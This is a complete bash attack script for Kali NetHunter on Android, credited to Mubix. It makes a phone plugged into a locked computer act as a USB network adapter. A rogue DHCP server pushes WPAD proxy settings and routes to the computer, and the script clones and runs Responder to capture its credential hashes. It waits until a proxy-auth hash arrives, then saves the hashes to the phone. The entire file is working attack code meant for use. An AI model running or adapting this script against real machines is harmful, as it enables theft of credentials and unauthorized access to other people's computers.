#!/bin/bash
#
# Attack created by Mubix.  For more information see: 
# https://room362.com/post/2016/snagging-creds-from-locked-machines

# ================== #
# Define global variable
# ================== #
# Set nethunter path
nh_path="/data/local/nhsystem/kali-armhf"
# Shorten chroot command as we execute this script in android environment and sometimes we need to execute the program in Kali environmnet
chroot_nh="chroot $nh_path"
# Set your desired "network portion" address assigned to target here (without full stop at the end)
net_addr="1.0.0"
iface_addr="$net_addr.1"
# Timeout to stop this script when target not getting any ip address
countime=120


# ================== #
# Dependency checks
# ================== #
# dependency check function
dep_check(){
DEPS=(python git python-pip python-dev screen sqlite3 python-crypto)
for i in "${DEPS[@]}"
do
  PKG_OK=$($chroot_nh /usr/bin/dpkg-query -W --showformat='${Status}\n' ${i}|grep "install ok installed")
  echo " [+] Checking for installed dependency: ${i}"
  if [ "" == "$PKG_OK" ]; then
    echo " [-] Missing dependency: ${i}"
    echo " [+] Attempting to install...."
    $chroot_nh /usr/bin/sudo apt-get -y install ${i}
  fi
done

if [ ! -d "$nh_path/root/Responder" ]; then
    echo " [+] Downloading Responder..."
    $chroot_nh /usr/bin/git clone https://github.com/mame82/Responder /root/Responder
fi
}

# ================== #
# Define shutdown function
# ================== #
shutitdown(){
echo "\n [!] Shutting Down! Killing DHCPD, Responder, Screen, and everything!!"
pkill dhcpd
pkill python
$chroot_nh pkill Responder
$chroot_nh pkill screen
echo 0 > /proc/sys/net/ipv4/ip_forward
# Bring down interface
echo " [!] Bringing down $INTERFACE and revert the iptables"
ip link set $INTERFACE down
ip addr flush dev $INTERFACE
exit
}

# ================== #
# Check required tools in Android and Kali environment
# ================== #
dep_check
if [ ! -d "/data/local/nhsystem/kali-armhf/root/Responder" ]; then
    echo " [!] Responder not found! Exiting!"
    exit
fi
if ! busybox ls > /dev/null;then
    echo No busybox found
    exit 1
fi
if ! iptables -V;then
    echo iptables not found
    exit 1
fi

# ================== #
# Check if usb state is setup correctly before moving forward. 
# ================== #
if [ "$(getprop sys.usb.state | grep win)" != "" ] && [ "$(getprop sys.usb.state | grep rndis)" != "" ]; then
    INTERFACE=rndis0
elif [ "$(getprop sys.usb.state | grep mac)" != "" ] && [ "$(getprop sys.usb.state | grep ecm)" != "" ]; then
    INTERFACE=usb0
else
    echo " [-] Usb state is not configured properly, please check again."
    exit
fi

# ================== #
# Make sure Wifi and Cellular data is disable
# ================== #
if [ "$(ifconfig wlan0 | grep inet)" ]; then
    echo " [!] Wifi is running, shuting it down! "
    svc wifi disable
    sleep 1
    echo " [+] Wifi is down!"
elif [ "$(ifconfig rmnet_data0 | grep inet)" ]; then
    echo " [!] Mobile data is running, shuting it down! "
    svc data disable
    sleep 1
    echo " [+] Mobile data is down!"
fi

# ================== #
# Bring up interface and setup iptables
# ================== #
ip link set $INTERFACE down
ip addr flush dev $INTERFACE
ip addr add $iface_addr/1 dev $INTERFACE
ip link set $INTERFACE up
ip route add 0.0.0.0/0 dev $INTERFACE
# Catch the interrupt signal and run the shutdown script
trap shutitdown INT
echo 1 > /proc/sys/net/ipv4/ip_forward
# Setup iptables rules dumped from kernel log

# ================== #
# Remove all previous leases, pid, conf and Responder.db
# ================== #
echo " [!] Remove previous stored previous leases, pid, conf and Responder.db"
if [ -s $nh_path/var/lib/dhcp/dhcpd.leases ]; then
    rm -f $nh_path/var/lib/dhcp/dhcpd.leases
fi
if [ -s $nh_path/root/mubix_locked.conf ]; then
    rm $nh_path/root/mubix_locked.conf
fi
if [ -s $nh_path/run/dhcpd.pid ]; then
    rm $nh_path/run/dhcpd.pid
fi
if [ -s $nh_path/root/Responder/Responder.db ]; then
    rm $nh_path/root/Responder/Responder.db
fi

# Recreate leases file
touch $nh_path/var/lib/dhcp/dhcpd.leases

# ================== #
# Create custom dhcpd.conf
# ================== #
cat << EOF > $nh_path/root/mubix_locked.conf
ddns-update-style none;
default-lease-time 60;
max-lease-time 72;
authoritative;
log-facility local7;
# wpad
option local-proxy-config code 252 = text;
option classless-routes code 121 = array of unsigned integer 8;
option classless-routes-win code 249 = array of unsigned integer 8;

subnet 0.0.0.0 netmask 128.0.0.0 {
  range $net_addr.2 $net_addr.2;
  option routers $iface_addr;
  option domain-name "domain.local";
  option domain-name-servers $iface_addr;
 # option domain-name-servers $(getprop net.dns1);
#  option domain-name-servers 8.8.8.8;
  option classless-routes 1,0, 1,0,0,1,  1,128, 1,0,0,1;
  option classless-routes-win 1,0, 1,0,0,1,  1,128, 1,0,0,1;
  option local-proxy-config "http://$iface_addr/wpad.dat";
}
EOF

# ================== #
# Create a log file for screen program
# ================== #
echo " [+] Creating SCREEN logger"
cat << EOF > $nh_path/root/.screenrc
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
EOF
mkdir -p $nh_path/root/logs

# ================== #
# Start dhcpd
# ================== #
$chroot_nh /usr/sbin/dhcpd -cf /root/mubix_locked.conf -q

# ================== #
# Start Responder program on Kali environment
# ================== #
echo " [+] Starting Responder on Kali environment, dont worry, it's capturing"
$chroot_nh /usr/bin/screen -dmS Responder /usr/bin/python /root/Responder/Responder.py -I $INTERFACE -w -r -d -P

# ================== #
# Get target's IP and PC name
# ================== #
# loop over the lease file to see if target has been given the ip address and internet access.
while true; do
    echo " [!] Assigning address to target, timeout: $countime"
    target_addr=$(cat $nh_path/var/lib/dhcp/dhcpd.leases | grep "lease $net_addr" | awk 'NR==1{print $2}');
    if [ -z "$target_addr" ]; then
        if [ "$countime" -eq "0" ]; then  ## breaks loop if it takes more than x seconds
            echo " [-] No ip address is assigned to the target."
            shutitdown
            echo " [-] Exit."
            exit
        fi
        sleep 1
        ((countime--))
        echo -ne "\033[1A"
        echo -ne "\033[K"
    else
        echo " [+] Target ip address: $target_addr"
        target_pc_name=$(cat $nh_path/var/lib/dhcp/dhcpd.leases | grep "client-hostname" | awk 'NR==1{print $2}' | tr -d "\"\;")
        echo " [+] Target PC name: $target_pc_name"
        break
    fi
done

# ================== #
# Keep reading the result until hash is caught!
# ================== #
while true; do
    if [ ! -s "$nh_path/root/Responder/Responder.db" ]; then
        continue
    elif [ ! "$(cat $nh_path/root/Responder/Responder.db | grep 'Proxy-Auth')" ]; then
        continue
    else
        echo " [+] You ROCK \m/"
        # Vibrate phone when Hashes are obtained
        echo 500 > /sys/devices/virtual/timed_output/vibrator/enable
        break
    fi
done

# ================== #
# Check the result, Bro!!
# ================== #
$chroot_nh pkill Responder
pkill python
sleep 1
# Path to store the snagged hashes
store_path="/sdcard/windows-hashes_$target_pc_name-$(date '+%Y%m%d_%T').txt"
$chroot_nh /usr/bin/sqlite3 /root/Responder/Responder.db "select fullhash from responder where user LIKE '%$target_pc_name%'" >> $store_path
echo " [+] Hashes saved to $store_path"
cat $store_path
# ================== #
# Lets leave!!!
# ================== #
shutitdown





